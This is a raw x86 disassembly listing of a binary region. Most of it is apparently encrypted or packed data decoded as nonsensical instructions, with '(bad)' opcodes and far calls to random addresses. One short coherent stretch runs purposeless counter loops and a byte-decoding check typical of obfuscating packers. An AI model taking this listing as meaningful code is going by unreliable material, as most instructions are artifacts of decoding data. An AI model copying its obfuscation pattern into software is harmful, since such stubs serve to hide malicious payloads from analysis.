  417030:	retf   0x7c42
  417033:	xchg   ecx,eax
  417034:	div    DWORD PTR [eax+0x1a]
  417037:	sub    DWORD PTR [ecx-0x39],edx
  41703a:	stos   BYTE PTR es:[edi],al
  41703b:	or     DWORD PTR [eax+0x4e],ebp
  41703e:	fild   DWORD PTR [esi]
  417040:	mov    dl,0xe6
  417042:	(bad)  
  417043:	fild   WORD PTR [esp+ebx*8+0x4b]
  417047:	jb     0x417001
  417049:	jmp    0x8018ba07
  41704e:	inc    ecx
  41704f:	or     al,0x1c
  417051:	mov    al,BYTE PTR [ebx]
  417053:	(bad)  
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x57bedebb],edx
  41706d:	pop    edi
  41706e:	inc    ebp
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417042
  417077:	inc    edx
  417078:	adc    BYTE PTR [edi-0x5d],bh
  41707b:	mov    cs:0xd093f54a,al
  417081:	mov    esp,ds
  417083:	mov    bl,0x20
  417085:	push   esp
  417086:	xchg   ebp,eax
  417087:	mov    dl,0xb
  417089:	hlt    
  41708a:	adc    bh,BYTE PTR [esi+0x7d]
  41708d:	push   edi
  41708e:	in     eax,dx
  41708f:	or     al,0x90
  417091:	out    dx,eax
  417092:	mov    al,0xcd
  417094:	pusha  
  417095:	sub    eax,0x2f9b6233
  41709a:	loope  0x41705d
  41709c:	loopne 0x4170a1
  41709e:	les    edi,FWORD PTR [edx+0x5b]
  4170a1:	sbb    BYTE PTR [edx-0x21],al
  4170a4:	les    ebx,FWORD PTR [eax-0x1b]
  4170a7:	xor    bh,BYTE PTR [edx]
  4170a9:	jg     0x417094
  4170ab:	adc    DWORD PTR [ebx],edx
  4170ad:	out    dx,eax
  4170ae:	cs push edi
  4170b0:	iret   
  4170b1:	(bad)  
  4170b2:	push   ds
  4170b3:	inc    edx
  4170b4:	mov    ds:0x892ab9f6,al
  4170b9:	int    0xe3
  4170bb:	push   0x49d67b03
  4170c0:	out    0xd4,al
  4170c2:	dec    edi
  4170c3:	pop    eax
  4170c4:	ins    BYTE PTR es:[edi],dx
  4170c5:	clc    
  4170c6:	aaa    
  4170c7:	sbb    eax,0x232962bc
  4170cc:	repz xchg esp,eax
  4170ce:	ret    
  4170cf:	pop    ecx
  4170d0:	fwait
  4170d1:	sbb    cl,BYTE PTR [edx-0x4a7c118f]
  4170d7:	into   
  4170d8:	cmp    BYTE PTR [esi],dl
  4170da:	cli    
  4170db:	sub    esp,DWORD PTR [eax-0x3d0834d3]
  4170e1:	xchg   DWORD PTR [ecx+0x3a],esp
  4170e4:	dec    ecx
  4170e5:	mov    ebx,0xaf8bb204
  4170ea:	scas   eax,DWORD PTR es:[edi]
  4170eb:	stos   DWORD PTR es:[edi],eax
  4170ec:	stos   BYTE PTR es:[edi],al
  4170ed:	jne    0x4170d9
  4170ef:	sbb    al,0x3c
  4170f1:	adc    DWORD PTR [edi+0x4e11db32],esi
  4170f7:	mul    dl
  4170f9:	xchg   esp,eax
  4170fa:	out    0x19,al
  4170fc:	sbb    ah,BYTE PTR [esi-0x716c630c]
  417102:	pushf  
  417103:	(bad)  
  417105:	dec    edx
  417106:	sbb    BYTE PTR [edi-0x3076b5b5],ah
  41710c:	add    BYTE PTR [eax+0x24],al
  41710f:	pop    ds
  417110:	ret    0xff8c
  417113:	xor    ecx,ebp
  417115:	and    bl,al
  417117:	in     eax,0x7f
  417119:	sbb    al,0xad
  41711b:	es int3 
  41711d:	cwde   
  41711e:	fadd   DWORD PTR [edi-0x7e375573]
  417124:	mov    dl,0xf1
  417126:	jp     0x4170da
  417128:	pop    es
  417129:	(bad)  
  41712a:	xor    al,0xc4
  41712c:	inc    ebp
  41712d:	call   0xbcee:0xac908a17
  417134:	jl     0x417183
  417136:	dec    eax
  417137:	xchg   BYTE PTR [ebp-0x295e30ee],cl
  41713d:	adc    dl,BYTE PTR [eax+0x40afa98]
  417143:	jge    0x417197
  417145:	das    
  417146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417147:	mov    dl,0x8d
  417149:	test   BYTE PTR [esi],ch
  41714b:	inc    esp
  41714c:	lods   eax,DWORD PTR ds:[esi]
  41714d:	sub    ebp,DWORD PTR [esi-0x7593c9ef]
  417153:	pop    ebp
  417154:	imul   esp,DWORD PTR [esi],0x19
  417157:	push   edx
  417158:	dec    ebx
  417159:	mov    edx,0x9f515c71
  41715e:	ret    0xa25a
  417161:	add    eax,0xdb77e6ff
  417166:	aaa    
  417167:	push   esi
  417168:	inc    eax
  417169:	dec    esi
  41716a:	xchg   ebx,eax
  41716b:	ret    
  41716c:	cmp    bh,cl
  41716e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41716f:	pop    esi
  417170:	cmp    eax,0xcd89f609
  417175:	cmp    esi,DWORD PTR [edx]
  417177:	add    eax,0x6dbe49ea
  41717c:	cli    
  41717d:	and    ebp,0xffffffa1
  417180:	ja     0x4171de
  417182:	inc    esp
  417183:	jge    0x417144
  417185:	iret   
  417186:	sub    DWORD PTR [edi+0xb33842e],ecx
  41718c:	fcmovnb st,st(4)
  41718e:	call   0x92d:0xbe53d48c
  417195:	push   esi
  417196:	ret    0xe54f
  417199:	scas   eax,DWORD PTR es:[edi]
  41719a:	inc    ebp
  41719b:	jle    0x41711e
  41719d:	fbld   TBYTE PTR [esi]
  41719f:	adc    al,0x63
  4171a1:	xchg   edi,eax
  4171a2:	aaa    
  4171a3:	push   esi
  4171a4:	test   edi,edi
  4171a6:	adc    edi,DWORD PTR [ecx]
  4171a8:	scas   eax,DWORD PTR es:[edi]
  4171a9:	sbb    eax,0x7bcdc6de
  4171af:	int    0xe8
  4171b1:	dec    esi
  4171b2:	dec    eax
  4171b3:	jmp    0xad96a2b0
  4171b8:	sbb    bl,BYTE PTR [ebp+0x4c]
  4171bb:	dec    esi
  4171bc:	jl     0x4171e5
  4171be:	pop    es
  4171bf:	mov    ebp,ebx
  4171c1:	mov    ecx,0x386bee6b
  4171c6:	std    
  4171c7:	rol    DWORD PTR [ebx],1
  4171c9:	sub    DWORD PTR [esi+ecx*2+0x7ce5f7db],edi
  4171d0:	(bad)  
  4171d2:	inc    ebp
  4171d3:	out    dx,eax
  4171d4:	dec    esi
  4171d5:	mov    bl,0xcb
  4171d7:	jno    0x41722a
  4171d9:	lea    ebp,[ecx+0x9]
  4171dc:	inc    esp
  4171dd:	jb     0x417174
  4171df:	sbb    dh,dh
  4171e1:	sbb    edi,DWORD PTR [eax+0x712d9da9]
  4171e7:	mov    esi,0xa21c9c20
  4171ec:	or     al,0x36
  4171ee:	clc    
  4171ef:	or     dl,al
  4171f1:	add    BYTE PTR [ecx+0x65b3cf8e],al
  4171f7:	fidivr DWORD PTR [edx+esi*4+0x60bea036]
  4171fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ff:	sbb    cl,al
  417201:	mov    ebp,0xddf34152
  417206:	aad    0x80
  417208:	add    al,0x22
  41720a:	xor    bl,BYTE PTR [edx-0x638d650d]
  417210:	mov    cl,0xd8
  417212:	int3   
  417213:	stc    
  417214:	cmc    
  417215:	add    DWORD PTR [ebp+edi*1-0x18c05753],0x6d
  41721d:	mov    DWORD PTR [edi],eax
  41721f:	jns    0x4171d3
  417221:	inc    ecx
  417222:	xchg   ebx,ebx
  417224:	inc    ecx
  417225:	out    dx,al
  417226:	dec    ecx
  417227:	cmp    DWORD PTR ds:0x249ba1a7,esi
  41722d:	adc    DWORD PTR [ebp-0x641be64],eax
  417233:	(bad)  
  417234:	mov    dh,0x5
  417236:	cmp    al,0x34
  417238:	jmp    0x417247
  41723a:	dec    ebx
  41723b:	sbb    al,0xb3
  41723d:	sar    DWORD PTR [edi+0x366032c1],cl
  417243:	sbb    DWORD PTR [ecx],eax
  417245:	sahf   
  417246:	clc    
  417247:	stos   DWORD PTR es:[edi],eax
  417248:	mov    eax,0xcd06d1f7
  41724d:	bound  esp,QWORD PTR [eax-0x2c657ce4]
  417253:	cmp    BYTE PTR [ecx],dh
  417255:	popf   
  417256:	push   0xffffffdc
  417258:	lds    edi,FWORD PTR [edx+0x2353f845]
  41725e:	adc    bl,BYTE PTR [esi-0x26]
  417261:	cmp    eax,0x8c3cc7cf
  417266:	mov    ds:0x1dac969d,eax
  41726b:	ds jbe 0x4172eb
  41726e:	int3   
  41726f:	stc    
  417270:	mov    ebx,0x50390b6b
  417275:	cmp    bl,bh
  417277:	aad    0x36
  417279:	xor    DWORD PTR [edi+ebp*2],0xc319d8d7
  417280:	hlt    
  417281:	xchg   esi,eax
  417282:	add    DWORD PTR [ebx],ebp
  417284:	jnp    0x41720d
  417286:	mov    ds:0xaeedc723,eax
  41728b:	cmp    ebx,DWORD PTR [esi-0x6e614b6f]
  417291:	sbb    dl,BYTE PTR [edi+0x45d86fd2]
  417297:	adc    ebp,DWORD PTR [ebx-0x50]
  41729a:	cmp    al,0xca
  41729c:	shl    BYTE PTR [edx-0x79],cl
  41729f:	cmp    ecx,0xdfc94d76
  4172a5:	stos   DWORD PTR es:[edi],eax
  4172a6:	addr16 in eax,dx
  4172a8:	(bad)  
  4172a9:	mov    al,ds:0x598ad9b2
  4172ae:	pop    DWORD PTR [eax-0x38]
  4172b1:	pop    es
  4172b2:	xor    esi,DWORD PTR [ebx]
  4172b4:	pop    ebx
  4172b5:	or     bl,BYTE PTR [ecx-0x55ea43b4]
  4172bb:	cli    
  4172bc:	jl     0x41725b
  4172be:	add    al,0xb2
  4172c0:	add    eax,0x82489288
  4172c5:	inc    edi
  4172c6:	retf   
  4172c7:	or     eax,0x472dfbfd
  4172cc:	(bad)  
  4172ce:	ret    0xe099
  4172d1:	jp     0x417317
  4172d3:	mov    esp,0xc4ebaa07
  4172d8:	cmp    eax,0x5be34bc8
  4172dd:	dec    ebp
  4172de:	mov    bh,0xcd
  4172e0:	add    eax,ecx
  4172e2:	call   0x36b9:0x13e7e35c
  4172e9:	arpl   WORD PTR [edx-0x25],ax
  4172ec:	mov    ds,WORD PTR [edi]
  4172ee:	jne    0x4172b5
  4172f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172f1:	icebp  
  4172f2:	pusha  
  4172f3:	adc    DWORD PTR [ebx-0x1d],ebx
  4172f6:	sti    
  4172f7:	xor    BYTE PTR [ebp+ebp*2+0x2a],ah
  4172fb:	repnz xor DWORD PTR [ebp+eax*4+0x20c6c30d],edx
  417303:	jae    0x417310
  417305:	xor    esi,esp
  417307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417308:	pop    es
  417309:	dec    edx
  41730a:	pop    ebx
  41730b:	pop    ecx
  41730c:	and    dl,BYTE PTR [ecx]
  41730e:	ss ret 0xffb6
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	ror    BYTE PTR [ecx+0x21],1
  417335:	add    eax,0x7f28e2bb
  41733a:	js     0x4172d1
  41733c:	jle    0x4173b6
  41733e:	js     0x41731b
  417340:	jge    0x41732a
  417342:	in     eax,dx
  417343:	pop    es
  417344:	pop    esp
  417345:	mov    ebx,0xde4c839
  41734a:	pusha  
  41734b:	stos   BYTE PTR es:[edi],al
  41734c:	sub    DWORD PTR ds:0x9dbe686a,ecx
  417352:	jp     0x41736b
  417354:	add    al,ah
  417356:	aaa    
  417357:	aad    0xbb
  417359:	retf   0xfab1
  41735c:	stc    
  41735d:	je     0x4172f6
  41735f:	add    ebx,esp
  417361:	loopne 0x41731c
  417363:	imul   esi,DWORD PTR [ebx+0x41],0xffffff8a
  417367:	(bad)  
  417368:	pop    ss
  417369:	das    
  41736a:	pop    esp
  41736b:	stos   DWORD PTR es:[edi],eax
  41736c:	and    eax,0x9c43ceec
  417371:	arpl   WORD PTR [edx],di
  417373:	sub    ecx,DWORD PTR [ecx+0xc]
  417376:	adc    esp,ebp
  417378:	sbb    al,0xfc
  41737a:	inc    eax
  41737b:	pushf  
  41737c:	jno    0x417342
  41737e:	mov    ds:0x9b2cc2c0,al
  417383:	lock inc eax
  417385:	mov    esp,0xf331dfed
  41738a:	cmp    ecx,0xfed31e3b
  417390:	pushf  
  417391:	xchg   ecx,eax
  417392:	out    dx,eax
  417393:	scas   eax,DWORD PTR es:[edi]
  417394:	cmc    
  417395:	scas   eax,DWORD PTR es:[edi]
  417396:	jle    0x417338
  417398:	inc    ebp
  417399:	inc    ebp
  41739a:	jg     0x4173b5
  41739c:	fld    DWORD PTR [si-0x4306]
  4173a1:	jp     0x417387
  4173a3:	adc    al,0x43
  4173a5:	xchg   esi,eax
  4173a6:	dec    ebx
  4173a7:	xchg   BYTE PTR [ebp-0x54],cl
  4173aa:	jecxz  0x4173b1
  4173ac:	ficomp WORD PTR [edx+0x36]
  4173af:	xor    DWORD PTR [edi-0x10f2c89a],edx
  4173b5:	loopne 0x417407
  4173b7:	lds    esp,FWORD PTR [esi+0x5fc92909]
  4173bd:	out    dx,al
  4173be:	pushf  
  4173bf:	(bad)  
  4173c0:	push   ds
  4173c1:	mov    bh,0xc1
  4173c3:	push   ebx
  4173c4:	retf   0xae08
  4173c7:	icebp  
  4173c8:	or     BYTE PTR [eax+ebx*4+0x2116d48e],al
  4173cf:	sbb    DWORD PTR [ebx],esp
  4173d1:	cmp    bl,BYTE PTR [ecx]
  4173d3:	adc    eax,0x65e94d9e
  4173d8:	dec    esp
  4173d9:	mov    dl,0xf5
  4173db:	cmc    
  4173dc:	jl     0x417409
  4173de:	add    eax,0x23bdb7f2
  4173e3:	std    
  4173e4:	cdq    
  4173e5:	mov    edi,0x9fae9464
  4173ea:	stos   BYTE PTR es:[edi],al
  4173eb:	jo     0x417386
  4173ed:	stc    
  4173ee:	and    DWORD PTR [esi+ecx*8+0x6e3045b6],0x9a0aa09a
  4173f9:	add    ch,cl
  4173fb:	fidiv  WORD PTR [esi-0x1e]
  4173fe:	cmp    esi,ebp
  417400:	fbld   TBYTE PTR [eax-0x63]
  417403:	dec    esi
  417404:	and    BYTE PTR [ebp+0x4744a093],dl
  41740a:	jg     0x417472
  41740c:	mov    al,ds:0x8c417be4
  417411:	push   0x2091df51
  417416:	mov    ah,0x42
  417418:	sub    eax,0x6ce50fb8
  41741d:	out    0xa9,al
  41741f:	adc    edi,DWORD PTR [edi+edx*4]
  417422:	int    0x9f
  417424:	cmc    
  417425:	shl    DWORD PTR es:[esi-0x140f041a],0x5f
  41742d:	mov    ebp,0x727f1dc7
  417432:	and    bl,bl
  417434:	xchg   ebp,eax
  417435:	jmp    0x1058:0x52cd0a18
  41743c:	sbb    eax,esp
  41743e:	adc    al,0x6d
  417440:	loopne 0x4173f3
  417442:	ror    DWORD PTR ds:0x17bcdc9,0x9c
  417449:	out    0x4b,eax
  41744b:	push   esi
  41744c:	or     eax,0xbbe99548
  417451:	fwait
  417452:	xchg   edx,eax
  417453:	mov    WORD PTR [ebx+0x2a84a897],?
  417459:	pusha  
  41745a:	or     BYTE PTR [edi+ebp*1+0x7a],0x71
  41745f:	mov    ebp,0x1126e924
  417464:	push   edi
  417465:	out    dx,al
  417466:	call   0x334d:0x55b17239
  41746d:	std    
  41746e:	aas    
  41746f:	imul   ebp,DWORD PTR [edx-0x55],0xe18efbf8
  417476:	pushf  
  417477:	fsub   QWORD PTR [ecx-0x4a484d3b]
  41747d:	pop    esi
  41747e:	sbb    eax,0x3520434b
  417483:	mov    esi,0x2d56dd1e
  417488:	mov    BYTE PTR [edx+0x49],al
  41748b:	pop    esp
  41748c:	mov    WORD PTR es:[edi],gs
  41748f:	loop   0x417442
  417491:	and    eax,0x4b16ac29
  417496:	mov    edx,0x32591668
  41749b:	enter  0xe5f,0x62
  41749f:	sbb    edx,DWORD PTR ds:0x446f20ce
  4174a5:	add    al,0x77
  4174a7:	in     al,dx
  4174a8:	(bad)  
  4174a9:	adc    al,bh
  4174ab:	pop    ebx
  4174ac:	fiadd  WORD PTR [ebx+0x11a31ed]
  4174b2:	ins    WORD PTR es:[edi],dx
  4174b4:	add    al,0x6e
  4174b6:	or     al,0x13
  4174b8:	xor    ah,cl
  4174ba:	std    
  4174bb:	jge    0x417527
  4174bd:	pop    ds
  4174be:	outs   dx,DWORD PTR ds:[esi]
  4174bf:	mov    cs,WORD PTR [edx-0x6dae9f46]
  4174c5:	and    bh,BYTE PTR gs:[ebx]
  4174c8:	mov    al,ds:0xcbab6f16
  4174cd:	ret    
  4174ce:	aam    0xd3
  4174d0:	mov    eax,ds:0xfd174858
  4174d5:	je     0x417469
  4174d7:	jb     0x41751a
  4174d9:	in     al,0xa6
  4174db:	rcl    BYTE PTR [ebx+0xdd1096c],0xf3
  4174e2:	pop    ebx
  4174e3:	jecxz  0x417494
  4174e5:	into   
  4174e6:	jo     0x41751d
  4174e8:	loope  0x4174be
  4174ea:	push   esi
  4174eb:	retf   0x3e29
  4174ee:	mov    esi,0x6f8e6d33
  4174f3:	and    eax,0x89030fe
  4174f8:	and    eax,0xaea0ee47
  4174fd:	sub    eax,0x109e1e69
  417502:	mov    ebx,0xfb517732
  417507:	mov    ch,0xcb
  417509:	inc    ebp
  41750a:	fisub  DWORD PTR ds:0x6ef245e2
  417510:	retf   
  417511:	clc    
  417512:	test   eax,0x8d68cd8b
  417517:	fld    QWORD PTR [edi+0x6a24d7e7]
  41751d:	inc    esi
  41751e:	add    esi,DWORD PTR [esi+0x5237f14d]
  417524:	jmp    0xbc036755
  417529:	inc    DWORD PTR [ebp+0x6a]
  41752c:	repz sahf 
  41752e:	js     0x4174dc
  417530:	cld    
  417531:	xor    esi,DWORD PTR [ecx+ecx*2+0x70]
  417535:	or     DWORD PTR [ecx+0x49],0x595062de
  41753c:	sbb    DWORD PTR [ecx-0x7732c188],esi
  417542:	push   es
  417543:	inc    edi
  417544:	es mov al,0x9f
  417547:	cmp    eax,0x66f60170
  41754c:	in     eax,dx
  41754d:	cmp    al,0xcc
  41754f:	retf   
  417550:	xor    al,cl
  417552:	jno    0x4175ac
  417554:	pop    edi
  417555:	xchg   DWORD PTR [eax],eax
  417557:	push   eax
  417558:	mov    ss,WORD PTR [esp+ebp*1]
  41755b:	xor    esp,ecx
  41755d:	push   DWORD PTR [edx+0x20]
  417560:	ds xchg esp,eax
  417562:	xor    bh,bl
  417564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417565:	and    BYTE PTR gs:[edi-0x3904c1b2],ch
  41756c:	jl     0x4175a0
  41756e:	imul   ecx,DWORD PTR [edx-0x6d],0xef566293
  417575:	fwait
  417576:	ja     0x417504
  417578:	or     ah,cl
  41757a:	les    eax,FWORD PTR [edi]
  41757c:	inc    eax
  41757d:	into   
  41757e:	and    eax,0x55be0c32
  417583:	mov    ecx,0x615a3c8b
  417588:	mov    ah,0xba
  41758a:	jne    0x417516
  41758c:	jp     0x417601
  41758e:	fisubr WORD PTR [eax+0x5b]
  417591:	mov    dl,cl
  417593:	mov    fs,WORD PTR [eax]
  417595:	mov    edx,0x72698045
  41759a:	mul    DWORD PTR [edi+edi*2-0x69]
  41759e:	xor    DWORD PTR [edi+0x10],ebp
  4175a1:	cld    
  4175a2:	(bad)  
  4175a3:	cld    
  4175a4:	rol    BYTE PTR [esi-0x50],1
  4175a7:	push   ss
  4175a8:	push   ecx
  4175a9:	push   ds
  4175aa:	outs   dx,BYTE PTR ds:[esi]
  4175ab:	inc    ecx
  4175ac:	popa   
  4175ad:	push   ecx
  4175ae:	push   ebx
  4175af:	into   
  4175b0:	sti    
  4175b1:	ins    BYTE PTR es:[edi],dx
  4175b2:	push   0x6f30a4a9
  4175b7:	pop    edi
  4175b8:	stos   BYTE PTR es:[edi],al
  4175b9:	push   edi
  4175ba:	dec    esi
  4175bb:	call   0xac50:0x40052c57
  4175c2:	jg     0x41756a
  4175c4:	cmp    eax,0xfc1c9ffc
  4175c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ca:	inc    edx
  4175cb:	outs   dx,DWORD PTR ds:[esi]
  4175cc:	sahf   
  4175cd:	les    ecx,FWORD PTR [edx+0x77902c3d]
  4175d3:	sub    dh,BYTE PTR [ecx-0xc]
  4175d6:	sbb    DWORD PTR [ebp-0x39fcfea0],ecx
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a899,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a899,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a899,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7d9
  41760e:	push   0x42a825
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a972
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a899,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a899
  417633:	dec    eax
  417634:	mov    ds:0x42a899,eax
  417639:	mov    eax,ds:0x42a899
  41763e:	dec    eax
  41763f:	mov    ds:0x42a899,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a82d,0x0
  41765b:	mov    eax,ds:0x42a82d
  417660:	inc    eax
  417661:	mov    ds:0x42a82d,eax
  417666:	cmp    DWORD PTR ds:0x42a82d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42ab12
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a82d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	jo     0x417656
  4176bc:	shr    BYTE PTR [edi+edi*2+0x5787f2d],cl
  4176c3:	jle    0x41773d
  4176c5:	js     0x4176b4
  4176c7:	in     eax,0xcd
  4176c9:	popa   
  4176ca:	dec    edx
  4176cb:	outs   dx,BYTE PTR ds:[esi]
  4176cc:	mov    edx,0x7859f270
  4176d1:	sbb    DWORD PTR [ecx-0x4e],eax
  4176d4:	mov    eax,esp
  4176d6:	lods   al,BYTE PTR ds:[esi]
  4176d7:	sti    
  4176d8:	jb     0x4176e8
  4176da:	test   eax,0xde962fcb
  4176df:	or     al,BYTE PTR [ecx]
  4176e1:	inc    ebp
  4176e2:	mov    ebx,0x1cfc484d
  4176e7:	pushf  
  4176e8:	popf   
  4176e9:	aad    0xbd
  4176eb:	shl    BYTE PTR [ecx+0x35b93403],1
  4176f1:	xor    DWORD PTR ds:0x3ba5e77c,ebp
  4176f7:	push   es
  4176f8:	loope  0x4176d0
  4176fa:	fucomip st,st(2)
  4176fc:	sub    DWORD PTR [ebx+0x71],ecx
  4176ff:	sub    al,0xbf
  417701:	pop    esi
  417702:	es adc eax,0x61e83b36
  417708:	add    ah,ah
  41770a:	in     eax,dx
  41770b:	dec    esp
  41770c:	cs jb  0x4176d0
  41770f:	sub    DWORD PTR [ebx+0x41c5ba62],0x833e688c
  417719:	int3   
  41771a:	sbb    DWORD PTR [esi],ebp
  41771c:	movups XMMWORD PTR [edx-0x11],xmm3
  417720:	psrlw  mm6,QWORD PTR [ecx+0x3354704f]
  417727:	ja     0x417791
  417729:	into   
  41772a:	mov    DWORD PTR [ecx+ecx*8],esi
  41772d:	int3   
  41772e:	sar    cl,0xc
  417731:	(bad)  
  417732:	mov    esi,0x8b880388
  417737:	dec    ebp
  417738:	add    cl,0x37
  41773b:	fimul  WORD PTR [edi]
  41773d:	push   eax
  41773e:	clc    
  41773f:	dec    ebp
  417740:	fbld   TBYTE PTR [ecx-0x1c]
  417743:	inc    esp
  417744:	enter  0xda7a,0x25
  417748:	mov    esp,0xc278d7cd
  41774d:	jge    0x4176e3
  41774f:	lock sub BYTE PTR [eax],dh
  417752:	pmulhw mm6,QWORD PTR [eax+ebp*4]
  417756:	in     al,0xc
  417758:	inc    edx
  417759:	call   0x42bfc90a
  41775e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41775f:	imul   esi,DWORD PTR [edi-0x510332cf],0xa3f5ccf4
  417769:	sahf   
  41776a:	(bad)  
  41776b:	sti    
  41776c:	pusha  
  41776d:	adc    DWORD PTR [ecx-0x20],ebp
  417770:	xor    al,BYTE PTR [ecx-0x7]
  417773:	jns    0x4177b5
  417775:	jmp    0xec84:0xde960596
  41777c:	adc    eax,0x868ce645
  417781:	stc    
  417782:	ds jle 0x41772b
  417785:	or     al,0xe1
  417787:	mov    bh,BYTE PTR [ebp+0x6]
  41778a:	test   DWORD PTR [edx+0xe50830b],esp
  417790:	cwde   
  417791:	mov    ah,0x8d
  417793:	cmp    ah,0x3
  417796:	or     BYTE PTR [eax+0x16],0x39
  41779a:	sbb    DWORD PTR [edi-0x107139dc],esi
  4177a0:	hlt    
  4177a1:	popf   
  4177a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a3:	push   0x26
  4177a5:	mov    edx,0x19ef4cbb
  4177aa:	(bad)  
  4177ab:	repz call 0xaf07:0xea5f6e2a
  4177b3:	ins    DWORD PTR es:[edi],dx
  4177b4:	stos   DWORD PTR es:[edi],eax
  4177b5:	outs   dx,DWORD PTR ds:[esi]
  4177b6:	fstp   DWORD PTR [ebx]
  4177b8:	stos   DWORD PTR es:[edi],eax
  4177b9:	xlat   BYTE PTR ds:[ebx]
  4177ba:	repz mov ebx,0x23a65e22
  4177c0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4177c2:	or     eax,0x8176c550
  4177c7:	or     BYTE PTR [ecx],dl
  4177c9:	and    eax,DWORD PTR [esi-0x2f]
  4177cc:	out    0xdc,eax
  4177ce:	sar    DWORD PTR [ebp+0x6b],1
  4177d1:	or     ecx,DWORD PTR [edx]
  4177d3:	(bad)  
  4177d4:	sub    eax,0xbaaf23ef
  4177d9:	xor    eax,esp
  4177db:	into   
  4177dc:	cmpxchg BYTE PTR [eax-0x4d94e49f],bl
  4177e3:	popf   
  4177e4:	les    edx,FWORD PTR [edx+ebp*4]
  4177e7:	sar    DWORD PTR [ebx],0x76
  4177ea:	dec    ah
  4177ec:	mov    dh,0x8c
  4177ee:	mov    esi,0x28b3bba2
  4177f3:	shr    dl,1
  4177f5:	jns    0x4177af
  4177f7:	sub    al,0x8b
  4177f9:	jle    0x4177c2
  4177fb:	dec    edx
  4177fc:	mov    ch,0xc
  4177fe:	aas    
  4177ff:	jnp    0x4177f7
  417801:	add    BYTE PTR ds:0x6884dd2c,ch
  417807:	jl     0x417839
  417809:	dec    esi
  41780a:	or     dl,dl
  41780c:	inc    ebx
  41780d:	push   ss
  41780e:	jg     0x4177ea
  417810:	fist   WORD PTR [eax+esi*8]
  417813:	jmp    DWORD PTR [edi+eiz*2-0x53]
  417817:	repz dec ebx
  417819:	lock fmul QWORD PTR [edi]
  41781c:	mov    ebx,0x86069778
  417821:	push   eax
  417822:	test   BYTE PTR [esi],cl
  417824:	dec    esi
  417825:	xor    eax,0xe296d1ab
  41782a:	pop    ds
  41782b:	fimul  DWORD PTR [esi+0x60]
  41782e:	sbb    DWORD PTR [edi+ebx*4-0x2d14495d],edx
  417835:	pusha  
  417836:	and    DWORD PTR [edx+0x71],eax
  417839:	inc    edi
  41783a:	mov    cl,0x87
  41783c:	pop    ss
  41783d:	(bad)  
  41783e:	sbb    bl,ah
  417840:	mov    ch,0xd1
  417842:	js     0x41789b
  417844:	xchg   edx,eax
  417845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417846:	iret   
  417847:	lods   al,BYTE PTR ds:[esi]
  417848:	(bad)  
  417849:	and    edi,DWORD PTR [ebx]
  41784b:	lods   eax,DWORD PTR ds:[esi]
  41784c:	pop    ecx
  41784d:	mov    bl,0xe8
  41784f:	test   BYTE PTR [eax-0x204d9661],0x87
  417856:	mov    ds:0xb64ce7c9,al
  41785b:	sub    esp,esp
  41785d:	xchg   ebx,eax
  41785e:	cwde   
  41785f:	fsubrp st(1),st
  417861:	jg     0x4178b1
  417863:	es xor eax,0xb9091b62
  417869:	mov    al,ds:0xf9fe3555
  41786e:	js     0x417896
  417870:	push   esi
  417871:	ins    DWORD PTR es:[edi],dx
  417872:	test   al,0x6d
  417874:	cld    
  417875:	mov    eax,esi
  417877:	bswap  ebx
  417879:	jo     0x4178eb
  41787b:	jbe    0x41788d
  41787d:	fbld   TBYTE PTR [edi+ebp*4-0x292e1b4e]
  417884:	clc    
  417885:	mov    cl,0x4f
  417887:	pop    ecx
  417888:	iret   
  417889:	popf   
  41788a:	pop    ss
